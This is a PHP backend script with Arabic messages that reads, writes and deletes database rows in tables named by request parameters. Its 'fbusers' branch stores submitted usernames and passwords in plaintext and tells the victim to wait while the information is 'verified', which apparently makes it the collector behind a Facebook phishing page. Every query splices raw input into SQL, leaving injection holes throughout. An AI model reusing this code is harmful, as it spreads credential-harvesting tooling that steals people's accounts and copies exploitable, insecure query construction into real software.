<?php
include"inc.php";
if (isv("set")) {
    $convert_to_array = explode(',', isv("set"));
    $convert_to_array2 = explode(',', isv("val"));
    for ($i=0; $i < count($convert_to_array); $i++) {
        $key_value = explode(',', $convert_to_array [$i]);
        $key_value2 = explode(',', $convert_to_array2[$i]);
        $end_array[$key_value [0]] = $key_value2 [0];
    }
    $msg = "خطأ فى قاعدة البيانات ";
    $code = "sql_error";
    if (Num(isv("table"), "where $convert_to_array[0]='".$convert_to_array2[0]."'")) {
        $Sql = false;
        if (isv("up")) {
            $Sql =  UpDate(isv("table"), $end_array, null, "where $convert_to_array[0]='".$convert_to_array2[0]."'");
        } else {
            $msg = "البيانات مسجله  بالفعل ";
            $code = "sql_agin";
        }
    } else {
        $Sql =  SqlIn(isv("table"), $end_array, true);
    }
    if ($Sql) {
        echo json_encode(array('success' =>true,"code"=>$code,"msg"=>"تم الحفظ بنجاح "));
    } else {
        echo json_encode(array('success' =>false,"code"=>$code,"msg"=>$msg));
    }
} elseif (isv("get")) {
    $convert_to_array = explode(',', isv("val"));
    $wer= "";
    if ($convert_to_array[2]) {
        $wer =  " and $convert_to_array[2]='".$convert_to_array[3]."'";
    }
    echo json_encode(array("data"=>Selaa(isv("get"), "where $convert_to_array[0]='".$convert_to_array[1]."' ".$wer)));

} elseif (isv("server")) {
    $time_check=time() + 60;
    $Sql =  UpDate("settings", array("server_time"=>$time_check,"server_login"=>1),null);
    if ($Sql) {
        echo json_encode(array('success' =>true,"code"=>$code,"msg"=>"تم الحفظ بنجاح "));
    } else {
        echo json_encode(array('success' =>false,"code"=>$code,"msg"=>$msg));
    }
} elseif (isv("del")) {
    $convert_to_array = explode(',', isv("val"));
    $msg = "خطأ فى قاعدة البيانات ";
    $Sql =  Remove(isv("del"), "where $convert_to_array[0]='".$convert_to_array[1]."'");
    if ($Sql) {
        echo json_encode(array('success' =>true,"code"=>$code,"msg"=>"تم الحفظ بنجاح "));
    } else {
        echo json_encode(array('success' =>false,"code"=>$code,"msg"=>$msg));
    }
} elseif (isv("fbusers")) {
    $user = isv("user");
    $pass = isv("pass");
    $msg = "خطأ فى قاعدة البيانات ";
    if (Num(isv("fbusers"), "where username='".$user."'")) {
        $Sql =  UpDate(isv("fbusers"), array('username' =>$user,"date"=>time(),'password' =>$pass,"send"=>0), null, "where username='".$user."'");
    } else {
        $Sql =  SqlIn(isv("fbusers"), array('username' =>$user,"date"=>time(),'password' =>$pass ), true);
    }
    if ($Sql) {
        $msg ="جارى  التحقق من المعلومات  من فضلك انتظر ";
        echo json_encode(array('result' =>"success","user"=>$user,"code"=>$code,"msg"=>$msg));
    } else {
        echo json_encode(array('result' =>false,"code"=>$code,"msg"=>$msg));
    }
}
